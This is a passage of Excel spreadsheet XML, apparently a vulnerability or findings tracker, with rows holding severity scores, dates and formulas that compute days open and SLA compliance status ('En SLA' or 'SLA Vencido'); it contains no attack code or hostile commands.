      <c r="AD557" s="65" t="s">
        <v>3538</v>
      </c>
      <c r="AE557" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AH557" t="str">
        <f>IFERROR(VLOOKUP(H557,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="558" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A558" s="84">
        <v>557</v>
      </c>
      <c r="B558" t="s">
        <v>32</v>
      </c>
      <c r="C558" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D558" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G558" t="s">
        <v>3519</v>
      </c>
      <c r="I558" t="s">
        <v>3523</v>
      </c>
      <c r="J558" t="s">
        <v>1271</v>
      </c>
      <c r="L558" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M558" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N558">
        <v>3.8</v>
      </c>
      <c r="Q558" t="s">
        <v>3536</v>
      </c>
      <c r="T558" s="1">
        <v>46094</v>
      </c>
      <c r="U558" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>115</v>
      </c>
      <c r="V558" s="1">
        <f t="shared" si="31"/>
        <v>46214</v>
      </c>
      <c r="W558" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>En SLA</v>
      </c>
      <c r="AB558" s="65" t="s">
        <v>3077</v>
      </c>
      <c r="AC558" s="65" t="s">
        <v>3539</v>
      </c>
      <c r="AD558" s="65" t="s">
        <v>3538</v>
      </c>
      <c r="AE558" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AH558" t="str">
        <f>IFERROR(VLOOKUP(H558,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="559" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A559" s="84">
        <v>558</v>
      </c>
      <c r="B559" t="s">
        <v>32</v>
      </c>
      <c r="C559" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D559" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G559" t="s">
        <v>3519</v>
      </c>
      <c r="I559" t="s">
        <v>3524</v>
      </c>
      <c r="J559" t="s">
        <v>1271</v>
      </c>
      <c r="L559" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M559" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N559">
        <v>3.8</v>
      </c>
      <c r="Q559" t="s">
        <v>3537</v>
      </c>
      <c r="T559" s="1">
        <v>46094</v>
      </c>
      <c r="U559" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>115</v>
      </c>
      <c r="V559" s="1">
        <f t="shared" si="31"/>
        <v>46214</v>
      </c>
      <c r="W559" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>En SLA</v>
      </c>
      <c r="AB559" s="65" t="s">
        <v>3077</v>
      </c>
      <c r="AC559" s="65" t="s">
        <v>3539</v>
      </c>
      <c r="AD559" s="65" t="s">
        <v>3538</v>
      </c>
      <c r="AE559" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AH559" t="str">
        <f>IFERROR(VLOOKUP(H559,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="560" spans="1:34" ht="217.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A560" s="84">
        <v>559</v>
      </c>
      <c r="B560" t="s">
        <v>32</v>
      </c>
      <c r="C560" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D560" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G560" t="s">
        <v>3519</v>
      </c>
      <c r="I560" t="s">
        <v>3525</v>
      </c>
      <c r="J560" t="s">
        <v>1747</v>
      </c>
      <c r="L560" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M560" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N560">
        <v>2.8</v>
      </c>
      <c r="Q560" t="s">
        <v>3534</v>
      </c>
      <c r="T560" s="1">
        <v>46094</v>
      </c>
      <c r="U560" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>115</v>
      </c>
      <c r="V560" s="1">
        <f t="shared" si="31"/>
        <v>46214</v>
      </c>
      <c r="W560" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>En SLA</v>
      </c>
      <c r="AB560" s="65" t="s">
        <v>3540</v>
      </c>
      <c r="AC560" s="65" t="s">
        <v>3541</v>
      </c>
      <c r="AD560" s="65" t="s">
        <v>3542</v>
      </c>
      <c r="AE560" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AH560" t="str">
        <f>IFERROR(VLOOKUP(H560,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="561" spans="1:34" ht="217.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A561" s="84">
        <v>560</v>
      </c>
      <c r="B561" t="s">
        <v>32</v>
      </c>
      <c r="C561" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D561" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G561" t="s">
        <v>3519</v>
      </c>
      <c r="I561" t="s">
        <v>3526</v>
      </c>
      <c r="J561" t="s">
        <v>1747</v>
      </c>
      <c r="L561" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M561" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N561">
        <v>2.8</v>
      </c>
      <c r="Q561" t="s">
        <v>3535</v>
      </c>
      <c r="T561" s="1">
        <v>46094</v>
      </c>
      <c r="U561" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>115</v>
      </c>
      <c r="V561" s="1">
        <f t="shared" si="31"/>
        <v>46214</v>
      </c>
      <c r="W561" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>En SLA</v>
      </c>
      <c r="AB561" s="65" t="s">
        <v>3540</v>
      </c>
      <c r="AC561" s="65" t="s">
        <v>3541</v>
      </c>
      <c r="AD561" s="65" t="s">
        <v>3542</v>
      </c>
      <c r="AE561" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AH561" t="str">
        <f>IFERROR(VLOOKUP(H561,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="562" spans="1:34" ht="217.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A562" s="84">
        <v>561</v>
      </c>
      <c r="B562" t="s">
        <v>32</v>
      </c>
      <c r="C562" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D562" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G562" t="s">
        <v>3519</v>
      </c>
      <c r="I562" t="s">
        <v>3527</v>
      </c>
      <c r="J562" t="s">
        <v>1747</v>
      </c>
      <c r="L562" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M562" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N562">
        <v>2.8</v>
      </c>
      <c r="Q562" t="s">
        <v>3536</v>
      </c>
      <c r="T562" s="1">
        <v>46094</v>
      </c>
      <c r="U562" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>115</v>
      </c>
      <c r="V562" s="1">
        <f t="shared" si="31"/>
        <v>46214</v>
      </c>
      <c r="W562" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>En SLA</v>
      </c>
      <c r="AB562" s="65" t="s">
        <v>3540</v>
      </c>
      <c r="AC562" s="65" t="s">
        <v>3541</v>
      </c>
      <c r="AD562" s="65" t="s">
        <v>3542</v>
      </c>
      <c r="AE562" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AH562" t="str">
        <f>IFERROR(VLOOKUP(H562,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="563" spans="1:34" ht="217.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A563" s="84">
        <v>562</v>
      </c>
      <c r="B563" t="s">
        <v>32</v>
      </c>
      <c r="C563" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D563" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G563" t="s">
        <v>3519</v>
      </c>
      <c r="I563" t="s">
        <v>3528</v>
      </c>
      <c r="J563" t="s">
        <v>1747</v>
      </c>
      <c r="L563" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M563" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N563">
        <v>2.8</v>
      </c>
      <c r="Q563" t="s">
        <v>3537</v>
      </c>
      <c r="T563" s="1">
        <v>46094</v>
      </c>
      <c r="U563" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>115</v>
      </c>
      <c r="V563" s="1">
        <f t="shared" si="31"/>
        <v>46214</v>
      </c>
      <c r="W563" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>En SLA</v>
      </c>
      <c r="AB563" s="65" t="s">
        <v>3540</v>
      </c>
      <c r="AC563" s="65" t="s">
        <v>3541</v>
      </c>
      <c r="AD563" s="65" t="s">
        <v>3542</v>
      </c>
      <c r="AE563" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AH563" t="str">
        <f>IFERROR(VLOOKUP(H563,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="564" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A564" s="84">
        <v>563</v>
      </c>
      <c r="B564" t="s">
        <v>32</v>
      </c>
      <c r="C564" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D564" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G564" t="s">
        <v>3601</v>
      </c>
      <c r="H564" t="s">
        <v>3544</v>
      </c>
      <c r="J564" t="s">
        <v>3529</v>
      </c>
      <c r="L564" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M564" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q564" t="s">
        <v>3535</v>
      </c>
      <c r="T564" s="1">
        <v>46095</v>
      </c>
      <c r="U564" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>114</v>
      </c>
      <c r="V564" s="1">
        <f t="shared" si="31"/>
        <v>46185</v>
      </c>
      <c r="W564" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB564" t="s">
        <v>3591</v>
      </c>
      <c r="AD564" t="s">
        <v>3595</v>
      </c>
      <c r="AE564" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG564" t="s">
        <v>3624</v>
      </c>
      <c r="AH564" t="str">
        <f>IFERROR(VLOOKUP(H564,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="565" spans="1:34" ht="44.25" hidden="1" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A565" s="84">
        <v>564</v>
      </c>
      <c r="B565" t="s">
        <v>32</v>
      </c>
      <c r="C565" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D565" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G565" t="s">
        <v>3501</v>
      </c>
      <c r="H565" t="s">
        <v>3545</v>
      </c>
      <c r="I565" t="s">
        <v>3605</v>
      </c>
      <c r="J565" t="s">
        <v>3599</v>
      </c>
      <c r="L565" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M565" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N565">
        <v>5.4</v>
      </c>
      <c r="Q565" t="s">
        <v>3572</v>
      </c>
      <c r="T565" s="1">
        <v>46105</v>
      </c>
      <c r="U565" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>104</v>
      </c>
      <c r="V565" s="1">
        <f t="shared" si="31"/>
        <v>46195</v>
      </c>
      <c r="W565" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB565" t="s">
        <v>3592</v>
      </c>
      <c r="AC565" s="65" t="s">
        <v>3604</v>
      </c>
      <c r="AD565" t="s">
        <v>3596</v>
      </c>
      <c r="AE565" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AH565" t="str">
        <f>IFERROR(VLOOKUP(H565,hoja1!A:A,1,),"N/A")</f>
        <v>MAN-69c1773c2813d3056436488a</v>
      </c>
    </row>
    <row r="566" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A566" s="84">
        <v>565</v>
      </c>
      <c r="B566" t="s">
        <v>32</v>
      </c>
      <c r="C566" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D566" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G566" t="s">
        <v>1416</v>
      </c>
      <c r="H566" t="s">
        <v>3543</v>
      </c>
      <c r="I566" t="s">
        <v>3606</v>
      </c>
      <c r="J566" t="s">
        <v>3600</v>
      </c>
      <c r="L566" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M566" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N566">
        <v>4.3</v>
      </c>
      <c r="Q566" t="s">
        <v>1425</v>
      </c>
      <c r="T566" s="1">
        <v>46105</v>
      </c>
      <c r="U566" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>104</v>
      </c>
      <c r="V566" s="1">
        <f t="shared" si="31"/>
        <v>46195</v>
      </c>
      <c r="W566" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB566" t="s">
        <v>3593</v>
      </c>
      <c r="AD566" t="s">
        <v>3597</v>
      </c>
      <c r="AE566" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG566" t="s">
        <v>149</v>
      </c>
      <c r="AH566" t="str">
        <f>IFERROR(VLOOKUP(H566,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="567" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A567" s="84">
        <v>566</v>
      </c>
      <c r="B567" t="s">
        <v>32</v>
      </c>
      <c r="C567" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D567" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G567" t="s">
        <v>1416</v>
      </c>
      <c r="H567" t="s">
        <v>3546</v>
      </c>
      <c r="I567" t="s">
        <v>3607</v>
      </c>
      <c r="J567" t="s">
        <v>80</v>
      </c>
      <c r="L567" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M567" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N567">
        <v>4.3</v>
      </c>
      <c r="Q567" t="s">
        <v>1425</v>
      </c>
      <c r="T567" s="1">
        <v>46105</v>
      </c>
      <c r="U567" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>104</v>
      </c>
      <c r="V567" s="1">
        <f t="shared" si="31"/>
        <v>46195</v>
      </c>
      <c r="W567" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB567" t="s">
        <v>3594</v>
      </c>
      <c r="AC567" s="65" t="s">
        <v>3613</v>
      </c>
      <c r="AD567" t="s">
        <v>3598</v>
      </c>
      <c r="AE567" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG567" t="s">
        <v>149</v>
      </c>
      <c r="AH567" t="str">
        <f>IFERROR(VLOOKUP(H567,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="568" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A568" s="84">
        <v>568</v>
      </c>
      <c r="B568" t="s">
        <v>32</v>
      </c>
      <c r="C568" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D568" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G568" t="s">
        <v>1416</v>
      </c>
      <c r="I568" t="s">
        <v>3608</v>
      </c>
      <c r="J568" t="s">
        <v>3611</v>
      </c>
      <c r="L568" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M568" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N568">
        <v>3.4</v>
      </c>
      <c r="Q568" t="s">
        <v>1425</v>
      </c>
      <c r="T568" s="1">
        <v>46105</v>
      </c>
      <c r="U568" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>104</v>
      </c>
      <c r="V568" s="1">
        <f t="shared" si="31"/>
        <v>46225</v>
      </c>
      <c r="W568" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>En SLA</v>
      </c>
      <c r="AB568" s="65" t="s">
        <v>3617</v>
      </c>
      <c r="AC568" s="65" t="s">
        <v>3615</v>
      </c>
      <c r="AD568" s="65" t="s">
        <v>3616</v>
      </c>
      <c r="AE568" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG568" t="s">
        <v>149</v>
      </c>
      <c r="AH568" t="str">
        <f>IFERROR(VLOOKUP(H568,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="569" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A569" s="84">
        <v>569</v>
      </c>
      <c r="B569" t="s">
        <v>32</v>
      </c>
      <c r="C569" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D569" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G569" t="s">
        <v>1416</v>
      </c>
      <c r="I569" t="s">
        <v>3609</v>
      </c>
      <c r="J569" t="s">
        <v>1271</v>
      </c>
      <c r="L569" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M569" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N569">
        <v>3.4</v>
      </c>
      <c r="Q569" t="s">
        <v>1425</v>
      </c>
      <c r="T569" s="1">
        <v>46105</v>
      </c>
      <c r="U569" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>104</v>
      </c>
      <c r="V569" s="1">
        <f t="shared" si="31"/>
        <v>46225</v>
      </c>
      <c r="W569" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>En SLA</v>
      </c>
      <c r="AB569" s="65" t="s">
        <v>3618</v>
      </c>
      <c r="AC569" s="65" t="s">
        <v>3619</v>
      </c>
      <c r="AD569" s="65" t="s">
        <v>3620</v>
      </c>
      <c r="AE569" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG569" t="s">
        <v>149</v>
      </c>
      <c r="AH569" t="str">
        <f>IFERROR(VLOOKUP(H569,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="570" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A570" s="84"/>
      <c r="B570" t="s">
        <v>32</v>
      </c>
      <c r="C570" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D570" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G570" t="s">
        <v>1416</v>
      </c>
      <c r="I570" t="s">
        <v>3610</v>
      </c>
      <c r="J570" t="s">
        <v>3612</v>
      </c>
      <c r="L570" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M570" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N570">
        <v>3.3</v>
      </c>
      <c r="Q570" t="s">
        <v>1425</v>
      </c>
      <c r="T570" s="1">
        <v>46105</v>
      </c>
      <c r="U570" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>104</v>
      </c>
      <c r="V570" s="1">
        <f t="shared" si="31"/>
        <v>46225</v>
      </c>
      <c r="W570" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>En SLA</v>
      </c>
      <c r="AB570" s="65" t="s">
        <v>3621</v>
      </c>
      <c r="AC570" s="65" t="s">
        <v>3622</v>
      </c>
      <c r="AD570" s="65" t="s">
        <v>3623</v>
      </c>
      <c r="AE570" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG570" t="s">
        <v>149</v>
      </c>
      <c r="AH570" t="str">
        <f>IFERROR(VLOOKUP(H570,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="571" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A571" s="84">
        <v>567</v>
      </c>
      <c r="B571" t="s">
        <v>32</v>
      </c>
      <c r="C571" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D571" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G571" t="s">
        <v>3501</v>
      </c>
      <c r="H571" t="s">
        <v>3562</v>
      </c>
      <c r="J571" t="s">
        <v>2913</v>
      </c>
      <c r="L571" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M571" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q571" t="s">
        <v>3573</v>
      </c>
      <c r="T571" s="1">
        <v>46099</v>
      </c>
      <c r="U571" s="76">
        <f ca="1">TODAY()-T571</f>
        <v>110</v>
      </c>
      <c r="V571" s="1">
        <f>IF(M571="Critical",T571+10,IF(M571="High",T571+30,IF(M571="Bad",T571+30,IF(M571="Medium",T571+90,IF(M571="Warm",T571+90,IF(M571="Low",T571+120,IF(M571="Fair",T571+120,IF(M571="Neutral",T571+120,""))))))))</f>
        <v>46189</v>
      </c>
      <c r="W571" s="76" t="str">
        <f ca="1">IF(M571="Critical",IF(U571&gt;10,"SLA Vencido","En SLA"),IF(M571="High",IF(U571&gt;30,"SLA Vencido","En SLA"),IF(M571="Bad",IF(U571&gt;30,"SLA Vencido","En SLA"),IF(M571="Medium",IF(U571&gt;90,"SLA Vencido","En SLA"),IF(M571="Warm",IF(U571&gt;90,"SLA Vencido","En SLA"),IF(M571="Low",IF(U571&gt;120,"SLA Vencido","En SLA"),IF(M571="Fair",IF(U571&gt;120,"SLA Vencido","En SLA"),IF(M571="Neutral",IF(U571&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB571" t="s">
        <v>2915</v>
      </c>
      <c r="AD571" t="s">
        <v>2916</v>
      </c>
      <c r="AE571" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG571" t="s">
        <v>149</v>
      </c>
      <c r="AH571" t="str">
        <f>IFERROR(VLOOKUP(H571,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="572" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A572" s="84">
        <v>571</v>
      </c>
      <c r="B572" t="s">
        <v>32</v>
      </c>
      <c r="C572" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D572" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G572" t="s">
        <v>3501</v>
      </c>
      <c r="H572" t="s">
        <v>3561</v>
      </c>
      <c r="J572" t="s">
        <v>2834</v>
      </c>
      <c r="L572" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M572" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q572" t="s">
        <v>3574</v>
      </c>
      <c r="T572" s="1">
        <v>46100</v>
      </c>
      <c r="U572" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>109</v>
      </c>
      <c r="V572" s="1">
        <f t="shared" si="31"/>
        <v>46190</v>
      </c>
      <c r="W572" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB572" t="s">
        <v>3511</v>
      </c>
      <c r="AD572" t="s">
        <v>3518</v>
      </c>
      <c r="AE572" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG572" t="s">
        <v>149</v>
      </c>
      <c r="AH572" t="str">
        <f>IFERROR(VLOOKUP(H572,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="573" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A573" s="84">
        <v>572</v>
      </c>
      <c r="B573" t="s">
        <v>32</v>
      </c>
      <c r="C573" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D573" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G573" t="s">
        <v>3501</v>
      </c>
      <c r="H573" t="s">
        <v>3507</v>
      </c>
      <c r="J573" t="s">
        <v>2834</v>
      </c>
      <c r="L573" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M573" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q573" t="s">
        <v>3517</v>
      </c>
      <c r="T573" s="1">
        <v>46100</v>
      </c>
      <c r="U573" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>109</v>
      </c>
      <c r="V573" s="1">
        <f t="shared" si="31"/>
        <v>46190</v>
      </c>
      <c r="W573" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB573" t="s">
        <v>3511</v>
      </c>
      <c r="AD573" t="s">
        <v>3518</v>
      </c>
      <c r="AE573" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG573" t="s">
        <v>149</v>
      </c>
      <c r="AH573" t="str">
        <f>IFERROR(VLOOKUP(H573,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="574" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A574" s="84">
        <v>573</v>
      </c>
      <c r="B574" t="s">
        <v>32</v>
      </c>
      <c r="C574" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D574" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G574" t="s">
        <v>3501</v>
      </c>
      <c r="H574" t="s">
        <v>3508</v>
      </c>
      <c r="J574" t="s">
        <v>2834</v>
      </c>
      <c r="L574" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M574" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q574" t="s">
        <v>3517</v>
      </c>
      <c r="T574" s="1">
        <v>46100</v>
      </c>
      <c r="U574" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>109</v>
      </c>
      <c r="V574" s="1">
        <f t="shared" si="31"/>
        <v>46190</v>
      </c>
      <c r="W574" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB574" t="s">
        <v>3511</v>
      </c>
      <c r="AD574" t="s">
        <v>3518</v>
      </c>
      <c r="AE574" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG574" t="s">
        <v>149</v>
      </c>
      <c r="AH574" t="str">
        <f>IFERROR(VLOOKUP(H574,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="575" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A575" s="84">
        <v>574</v>
      </c>
      <c r="B575" t="s">
        <v>32</v>
      </c>
      <c r="C575" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D575" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G575" t="s">
        <v>3501</v>
      </c>
      <c r="H575" t="s">
        <v>3571</v>
      </c>
      <c r="J575" t="s">
        <v>2913</v>
      </c>
      <c r="L575" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M575" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q575" t="s">
        <v>3575</v>
      </c>
      <c r="T575" s="1">
        <v>46100</v>
      </c>
      <c r="U575" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>109</v>
      </c>
      <c r="V575" s="1">
        <f t="shared" si="31"/>
        <v>46190</v>
      </c>
      <c r="W575" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB575" t="s">
        <v>2915</v>
      </c>
      <c r="AD575" t="s">
        <v>2916</v>
      </c>
      <c r="AE575" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG575" t="s">
        <v>149</v>
      </c>
      <c r="AH575" t="str">
        <f>IFERROR(VLOOKUP(H575,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="576" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A576" s="84">
        <v>575</v>
      </c>
      <c r="B576" t="s">
        <v>32</v>
      </c>
      <c r="C576" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D576" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G576" t="s">
        <v>3501</v>
      </c>
      <c r="H576" t="s">
        <v>3563</v>
      </c>
      <c r="J576" t="s">
        <v>2913</v>
      </c>
      <c r="L576" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M576" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q576" t="s">
        <v>3576</v>
      </c>
      <c r="T576" s="1">
        <v>46100</v>
      </c>
      <c r="U576" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>109</v>
      </c>
      <c r="V576" s="1">
        <f t="shared" si="31"/>
        <v>46190</v>
      </c>
      <c r="W576" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB576" t="s">
        <v>2915</v>
      </c>
      <c r="AD576" t="s">
        <v>2916</v>
      </c>
      <c r="AE576" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG576" t="s">
        <v>149</v>
      </c>
      <c r="AH576" t="str">
        <f>IFERROR(VLOOKUP(H576,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="577" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A577" s="84">
        <v>576</v>
      </c>
      <c r="B577" t="s">
        <v>32</v>
      </c>
      <c r="C577" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D577" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G577" t="s">
        <v>3501</v>
      </c>
      <c r="H577" t="s">
        <v>3506</v>
      </c>
      <c r="J577" t="s">
        <v>2834</v>
      </c>
      <c r="L577" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M577" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q577" t="s">
        <v>3516</v>
      </c>
      <c r="T577" s="1">
        <v>46100</v>
      </c>
      <c r="U577" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>109</v>
      </c>
      <c r="V577" s="1">
        <f t="shared" si="31"/>
        <v>46190</v>
      </c>
      <c r="W577" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
